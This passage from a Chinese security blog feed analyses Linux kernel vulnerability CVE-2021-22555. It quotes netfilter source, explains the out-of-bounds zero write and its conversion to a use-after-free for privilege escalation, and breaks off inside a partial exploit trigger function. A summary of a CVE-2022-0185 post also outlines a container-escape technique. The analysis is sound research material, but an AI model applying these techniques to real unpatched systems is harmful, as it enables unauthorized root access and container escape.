<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过 CVE-2021-22555 和本文的 CVE-2022-0185，对于这种能转化为 kmalloc-1024 的 UAF 的漏洞，本地提权的利用方式都很简单，只要 skb 修改 pipe_buffer 做 pipe primitive 就好了，而且 pipe primitive 不用 bypass kaslr，几乎一个 exp 就能通杀含有漏洞的 linux 各个版本，非常好用</p>
<p>但是对于 google <a href="https://github.com/google/kctf">kctf</a> 或者其他容器环境下，利用漏洞逃逸容器就不能用这种方式了，需要用 skb 劫持 pipe_buffer ops 进行 ROP 提权后执行 <code>switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)</code> 来获得 root namespace 的 root 权限</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<p>[1] <a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">https://www.willsroot.io/2022/01/cve-2022-0185.html</a></p>
</blockquote>
<blockquote>
<p>[2] <a href="https://www.hackthebox.com/blog/CVE-2022-0185:_A_case_study">https://www.hackthebox.com/blog/CVE-2022-0185:_A_case_study</a></p>
</blockquote>
<blockquote>
<p>[3] <a href="https://github.com/veritas501/pipe-primitive">https://github.com/veritas501/pipe-primitive</a></p>
</blockquote>
<blockquote>
<p>[4] <a href="https://github.com/veritas501/CVE-2022-0185-PipeVersion">https://github.com/veritas501/CVE-2022-0185-PipeVersion</a></p>
</blockquote>
<blockquote>
<p>[5] <a href="https://bsauce.github.io/2022/04/08/CVE-2022-0185/">https://bsauce.github.io/2022/04/08/CVE-2022-0185/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>kernel</category>
      </categories>
      <tags>
        <tag>kernel</tag>
        <tag>CVE</tag>
        <tag>pipe_primitive</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-22555</title>
    <url>/c7dcc58a/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>从4字节堆溢出写0到UAF，再到提权，该 linux kernel 漏洞的利用思路非常值得学习<br><img src="/images/c7dcc58a/pasted-0.png" alt="exploit"></p>
<span id="more"></span>


<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>漏洞影响的版本范围比较广的，根据google <a href="https://github.com/google/security-research/security/advisories/GHSA-xxx5-8mvq-3528">security-research</a> 描述，已经 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b29c457a6511435960115c0f548c4360d5f4801d">patch</a> 的版本有 5.12，5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267</p>
<p>这里偷懒选择已有的环境:<br><a href="https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2021-22555">https://github.com/bsauce/kernel-exploit-factory/tree/main/CVE-2021-22555</a></p>
<p>该内核版本为 5.11.14，稍后也以这个版本的源码来解析</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当在 64 位 linux 下，兼容运行 32 位程序，调用 <code>setsockopt(sockfd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, sizeof(data))</code>时，内核会先调用 <a href="https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1389">translate_compat_table</a> 将 <a href="https://elixir.bootlin.com/linux/v5.11.14/source/include/linux/netfilter/x_tables.h#L248"><strong>xt_table_info</strong></a> 32 位下的结构体转存储为 64 位模式的结构体：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* The table itself */</span>
<span class="token keyword">struct</span> <span class="token class-name">xt_table_info</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">/* Size per table */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span>
	<span class="token comment">/* Number of entries: FIXME. --RR */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> number<span class="token punctuation">;</span>
	<span class="token comment">/* Initial number of entries. Needed for module usage count */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> initial_entries<span class="token punctuation">;</span>

	<span class="token comment">/* Entry points and underflows */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> hook_entry<span class="token punctuation">[</span>NF_INET_NUMHOOKS<span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> underflow<span class="token punctuation">[</span>NF_INET_NUMHOOKS<span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	 * Number of user chains. Since tables cannot have loops, at most
	 * @stacksize jumps (number of user chains) can possibly be made.
	 */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> stacksize<span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span>jumpstack<span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> entries<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">__aligned</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中 entries 字段指向的是由 <a href="https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter_ipv4/ip_tables.h#L106"><strong>ipt_entry</strong></a> 结构体组成的数组:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">ipt_entry</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">ipt_ip</span> ip<span class="token punctuation">;</span>

	<span class="token comment">/* Mark with fields that we care about. */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> nfcache<span class="token punctuation">;</span>

	<span class="token comment">/* Size of ipt_entry + matches */</span>
	__u16 target_offset<span class="token punctuation">;</span>
	<span class="token comment">/* Size of ipt_entry + matches + target */</span>
	__u16 next_offset<span class="token punctuation">;</span>

	<span class="token comment">/* Back pointer */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> comefrom<span class="token punctuation">;</span>

	<span class="token comment">/* Packet and byte counters. */</span>
	<span class="token keyword">struct</span> <span class="token class-name">xt_counters</span> counters<span class="token punctuation">;</span>

	<span class="token comment">/* The matches (if any), then the target. */</span>
	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> elems<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>其中的 target_offset 是相对于 ipt_entry 的偏移，指向了一个 <a href="https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter/x_tables.h#L34"><strong>xt_entry_target</strong></a> 结构体:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">xt_entry_target</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
			__u16 target_size<span class="token punctuation">;</span>

			<span class="token comment">/* Used by userspace */</span>
			<span class="token keyword">char</span> name<span class="token punctuation">[</span>XT_EXTENSION_MAXNAMELEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
			__u8 revision<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span> user<span class="token punctuation">;</span>
		<span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
			__u16 target_size<span class="token punctuation">;</span>

			<span class="token comment">/* Used inside the kernel */</span>
			<span class="token keyword">struct</span> <span class="token class-name">xt_target</span> <span class="token operator">*</span>target<span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span> kernel<span class="token punctuation">;</span>

		<span class="token comment">/* Total length */</span>
		__u16 target_size<span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span> u<span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>漏洞出在 <code>translate_compat_table</code> 调用的 <a href="https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/x_tables.c#L1131">xt_compat_target_from_user</a>，调用 <code>memset(t-&gt;data + target-&gt;targetsize, pad)</code> 对齐空间清零</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">xt_compat_target_from_user</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_entry_target</span> <span class="token operator">*</span>t<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>dstptr<span class="token punctuation">,</span>
				<span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">xt_target</span> <span class="token operator">*</span>target <span class="token operator">=</span> t<span class="token operator">-></span>u<span class="token punctuation">.</span>kernel<span class="token punctuation">.</span>target<span class="token punctuation">;</span>
	<span class="token keyword">struct</span> <span class="token class-name">compat_xt_entry_target</span> <span class="token operator">*</span>ct <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">compat_xt_entry_target</span> <span class="token operator">*</span><span class="token punctuation">)</span>t<span class="token punctuation">;</span>
	<span class="token keyword">int</span> pad<span class="token punctuation">,</span> off <span class="token operator">=</span> <span class="token function">xt_compat_target_offset</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">u_int16_t</span> tsize <span class="token operator">=</span> ct<span class="token operator">-></span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>target_size<span class="token punctuation">;</span>
	<span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>t<span class="token operator">-></span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

	t <span class="token operator">=</span> <span class="token operator">*</span>dstptr<span class="token punctuation">;</span>
	<span class="token function">memcpy</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> ct<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>ct<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token operator">-></span>compat_from_user<span class="token punctuation">)</span>
		target<span class="token operator">-></span><span class="token function">compat_from_user</span><span class="token punctuation">(</span>t<span class="token operator">-></span>data<span class="token punctuation">,</span> ct<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">else</span>
		<span class="token function">memcpy</span><span class="token punctuation">(</span>t<span class="token operator">-></span>data<span class="token punctuation">,</span> ct<span class="token operator">-></span>data<span class="token punctuation">,</span> tsize <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token operator">*</span>ct<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pad <span class="token operator">=</span> <span class="token function">XT_ALIGN</span><span class="token punctuation">(</span>target<span class="token operator">-></span>targetsize<span class="token punctuation">)</span> <span class="token operator">-</span> target<span class="token operator">-></span>targetsize<span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pad <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>
		<span class="token function">memset</span><span class="token punctuation">(</span>t<span class="token operator">-></span>data <span class="token operator">+</span> target<span class="token operator">-></span>targetsize<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> pad<span class="token punctuation">)</span><span class="token punctuation">;</span>

	tsize <span class="token operator">+=</span> off<span class="token punctuation">;</span>
	t<span class="token operator">-></span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>target_size <span class="token operator">=</span> tsize<span class="token punctuation">;</span>
	<span class="token function">strlcpy</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> target<span class="token operator">-></span>name<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">module_put</span><span class="token punctuation">(</span>target<span class="token operator">-></span>me<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">strncpy</span><span class="token punctuation">(</span>t<span class="token operator">-></span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>name<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>t<span class="token operator">-></span>u<span class="token punctuation">.</span>user<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token operator">*</span>size <span class="token operator">+=</span> off<span class="token punctuation">;</span>
	<span class="token operator">*</span>dstptr <span class="token operator">+=</span> tsize<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而在 <code>translate_compat_table</code> 调用 <code>xt_alloc_table_info</code> 处，<strong>对 size 的计算并没有 <code>target-&gt;targetsize</code> 的参与</strong>，而仅在 <a href="https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1284"><code>check_compat_entry_size_and_hooks</code></a> 里，加上了为了对齐 matchsize 和 targetsize 的共 8 字节的大小，因此导致越界写 0 的效果</p>
<blockquote>
<p>IPT_SO_SET_REPLACE 需要 <strong>CAP_NET_ADMIN</strong> 权限，但是这个权限可以在新建 user、network 的命名空间里获得</p>
</blockquote>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="xt-table-info"><a href="#xt-table-info" class="headerlink" title="xt_table_info"></a>xt_table_info</h3><p>根据源码，可以分析出 xt_table_info 结构体的布局，如下图：<br><img src="/images/c7dcc58a/pasted-1.png" alt="xt_table_info"></p>
<p>其中 match 和 target 的 data 字段都是大小可变的，转存储后，给 match 和 target 都加上的 4 字节的补齐，然后就是越界 memset 了</p>
<h3 id="控制-targetsize"><a href="#控制-targetsize" class="headerlink" title="控制 targetsize"></a>控制 targetsize</h3><p>通过控制 targetsize ，则可以控制越界写 0，但是这个 targetsize 不能直接控制，通过选择不同的 target，对应不同的 targetsize，可以越界最多 0x4c 个字节，target 的选择在以下的调用链中<a href="https://elixir.bootlin.com/linux/v5.11.14/source/net/ipv4/netfilter/ip_tables.c#L1284">check_compat_entry_size_and_hooks</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/x_tables.c#L255">xt_request_find_target</a> -&gt; <a href="https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/x_tables.c#L226">xt_find_target</a></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">xt_target</span> <span class="token operator">*</span><span class="token function">xt_find_target</span><span class="token punctuation">(</span>u8 af<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">,</span> u8 revision<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">struct</span> <span class="token class-name">xt_target</span> <span class="token operator">*</span>t<span class="token punctuation">;</span>
	<span class="token keyword">int</span> err <span class="token operator">=</span> <span class="token operator">-</span>ENOENT<span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strnlen</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> XT_EXTENSION_MAXNAMELEN<span class="token punctuation">)</span> <span class="token operator">==</span> XT_EXTENSION_MAXNAMELEN<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token function">ERR_PTR</span><span class="token punctuation">(</span><span class="token operator">-</span>EINVAL<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>xt<span class="token punctuation">[</span>af<span class="token punctuation">]</span><span class="token punctuation">.</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">list_for_each_entry</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> <span class="token operator">&amp;</span>xt<span class="token punctuation">[</span>af<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">,</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>t<span class="token operator">-></span>name<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span>t<span class="token operator">-></span>revision <span class="token operator">==</span> revision<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">try_module_get</span><span class="token punctuation">(</span>t<span class="token operator">-></span>me<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					<span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>xt<span class="token punctuation">[</span>af<span class="token punctuation">]</span><span class="token punctuation">.</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">return</span> t<span class="token punctuation">;</span>
				<span class="token punctuation">&#125;</span>
			<span class="token punctuation">&#125;</span> <span class="token keyword">else</span>
				err <span class="token operator">=</span> <span class="token operator">-</span>EPROTOTYPE<span class="token punctuation">;</span> <span class="token comment">/* Found something. */</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token function">mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>xt<span class="token punctuation">[</span>af<span class="token punctuation">]</span><span class="token punctuation">.</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>af <span class="token operator">!=</span> NFPROTO_UNSPEC<span class="token punctuation">)</span>
		<span class="token comment">/* Try searching again in the family-independent list */</span>
		<span class="token keyword">return</span> <span class="token function">xt_find_target</span><span class="token punctuation">(</span>NFPROTO_UNSPEC<span class="token punctuation">,</span> name<span class="token punctuation">,</span> revision<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token function">ERR_PTR</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>google security-research 中的 poc 所使用的 NFLOG，在 <a href="https://elixir.bootlin.com/linux/v5.11.14/source/net/netfilter/xt_NFLOG.c#L72">nfqueue_tg_init</a> 中注册到 xt 变量里：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">xt_target</span> nfqueue_tg_reg<span class="token punctuation">[</span><span class="token punctuation">]</span> __read_mostly <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token punctuation">&#123;</span>
		<span class="token punctuation">.</span>name		<span class="token operator">=</span> <span class="token string">"NFQUEUE"</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>family		<span class="token operator">=</span> NFPROTO_UNSPEC<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>target		<span class="token operator">=</span> nfqueue_tg<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>targetsize	<span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_NFQ_info</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>me		<span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#123;</span>
		<span class="token punctuation">.</span>name		<span class="token operator">=</span> <span class="token string">"NFQUEUE"</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>revision	<span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>family		<span class="token operator">=</span> NFPROTO_UNSPEC<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>checkentry	<span class="token operator">=</span> nfqueue_tg_check<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>target		<span class="token operator">=</span> nfqueue_tg_v1<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>targetsize	<span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_NFQ_info_v1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>me		<span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#123;</span>
		<span class="token punctuation">.</span>name		<span class="token operator">=</span> <span class="token string">"NFQUEUE"</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>revision	<span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>family		<span class="token operator">=</span> NFPROTO_UNSPEC<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>checkentry	<span class="token operator">=</span> nfqueue_tg_check<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>target		<span class="token operator">=</span> nfqueue_tg_v2<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>targetsize	<span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_NFQ_info_v2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>me		<span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#123;</span>
		<span class="token punctuation">.</span>name		<span class="token operator">=</span> <span class="token string">"NFQUEUE"</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>revision	<span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>family		<span class="token operator">=</span> NFPROTO_UNSPEC<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>checkentry	<span class="token operator">=</span> nfqueue_tg_check<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>target		<span class="token operator">=</span> nfqueue_tg_v3<span class="token punctuation">,</span>
		<span class="token punctuation">.</span>targetsize	<span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_NFQ_info_v3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">.</span>me		<span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到这个 <a href="https://elixir.bootlin.com/linux/v5.11.14/source/include/uapi/linux/netfilter/xt_NFQUEUE.h#L19">xt_NFQ_info_v1</a> 结构体，只有 4 个字节，也就是 targetsize 为 4 个字节，计算得 <code>pad = 4</code>：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">xt_NFQ_info_v1</span> <span class="token punctuation">&#123;</span>
	__u16 queuenum<span class="token punctuation">;</span>
	__u16 queues_total<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样就可以越界写 4 字节的 0，通过调整 t-&gt;data 的位置，可以让其改写某些指针的低两字节，后面的利用中，就让这两字节改指针转化为 UAF 进行权限提升</p>
<h3 id="2-字节溢出写-0"><a href="#2-字节溢出写-0" class="headerlink" title="2 字节溢出写 0"></a>2 字节溢出写 0</h3><p>选择 xt_NFQ_info_v1，则可以 memset 4 个字节，可以想到的是，溢出写 0 用来改写某些结构体的指针来进一步利用，比如说 msg_msg.m_list.next 指针，但是改写指针低 4 个字节为 0 很可能不会得到一个有效的指针，所以需要做一下调整，只改指针低两字节则很可能得到一个有效的指针</p>
<p>通过调整 match 的 data 部分的大小，让 xt_table_info 结构体从一个页也就是 4K 大小中分配，并且 memset 刚好改写相邻的下一个页的低两字节，有具体如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">trigger_oob_write</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">struct</span> <span class="token class-name">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__packed__<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">struct</span> <span class="token class-name">ipt_replace</span> replace<span class="token punctuation">;</span>  <span class="token comment">// 0x5c</span>
        <span class="token keyword">struct</span> <span class="token class-name">ipt_entry</span> entry<span class="token punctuation">;</span>      <span class="token comment">// 0x70</span>
        <span class="token keyword">struct</span> <span class="token class-name">xt_entry_match</span> match<span class="token punctuation">;</span> <span class="token comment">// 0x20</span>
        <span class="token keyword">char</span> match_data<span class="token punctuation">[</span>PAGE_SIZE <span class="token operator">-</span> <span class="token number">0x40</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ipt_entry</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_entry_match</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">xt_entry_target</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">xt_entry_target</span> target<span class="token punctuation">;</span> <span class="token comment">// 0x20</span>
    <span class="token punctuation">&#125;</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    data<span class="token punctuation">.</span>replace<span class="token punctuation">.</span>num_counters <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>replace<span class="token punctuation">.</span>num_entries <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    data<span class="token punctuation">.</span>replace<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>entry<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match<span class="token punctuation">)</span> <span class="token operator">+</span>
                         <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>match_data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

